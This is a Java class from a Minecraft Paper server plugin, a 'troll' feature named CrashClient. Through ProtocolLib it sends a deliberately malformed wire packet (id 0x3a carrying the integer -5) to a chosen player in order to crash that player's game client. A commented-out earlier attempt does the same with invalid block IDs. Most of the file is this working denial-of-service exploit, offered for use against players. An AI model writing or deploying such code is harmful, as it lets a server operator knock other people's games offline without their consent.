package net.octopvp.octocore.paper.utils.trolls;

import com.comphenix.protocol.ProtocolLibrary;
import com.comphenix.protocol.events.PacketContainer;
import io.netty.buffer.ByteBuf;
import lombok.Getter;
import org.bukkit.entity.Player;

import java.lang.reflect.InvocationTargetException;

/**
 * Actually crashes the client pog
 */
public class CrashClient implements Troll {
    @Getter
    private static final CrashClient instance = new CrashClient();

    private CrashClient() {
    }

    @Override
    public void activate(Player target) {
        /*
        Random random = new Random(System.currentTimeMillis());
        for (int i = 0; i < 10; i++) {
            target.sendBlockChange(target.getLocation(), random.nextInt(2674) - 1337, (byte) 0);
        }
        target.sendBlockChange(target.getLocation(), -6666, (byte) 0);
        target.sendBlockChange(target.getLocation(), 6666, (byte) 0);
           */

        //target.crashClient();
        final ByteBuf buf = PacketContainer.createPacketBuffer();
        buf.writeInt(-5);
        byte[] bytes = new byte[buf.readableBytes()];
        buf.readBytes(bytes);
        buf.release();
        try {
            ProtocolLibrary.getProtocolManager().sendWirePacket(
                    target,
                    0x3a,
                    bytes
            );
        } catch (InvocationTargetException e) {
            e.printStackTrace();
        }
    }
}
